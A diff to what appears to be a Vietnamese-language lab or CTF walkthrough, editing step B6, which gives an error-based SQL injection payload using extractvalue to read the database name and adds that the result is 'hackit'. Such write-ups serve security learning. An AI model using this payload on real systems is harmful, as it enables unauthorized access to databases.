@@ -26,7 +26,7 @@
 
   ![image](https://user-images.githubusercontent.com/101852647/167061631-5dfed4d3-7c95-43fe-8d1a-57db03df1f24.png)
 
-- B6: Sử dụng câu lệnh `1%') union select extractvalue(0x0a,concat(0x0a,(select database()))) or ('%1` để tìm tên database.
+- B6: Sử dụng câu lệnh `1%') union select extractvalue(0x0a,concat(0x0a,(select database()))) or ('%1` để tìm tên database. Kết quả trả tên database về `hackit`
 
   ![image](https://user-images.githubusercontent.com/101852647/167061873-f92ca2bc-190d-4622-b5c2-a5503e14af95.png)
 
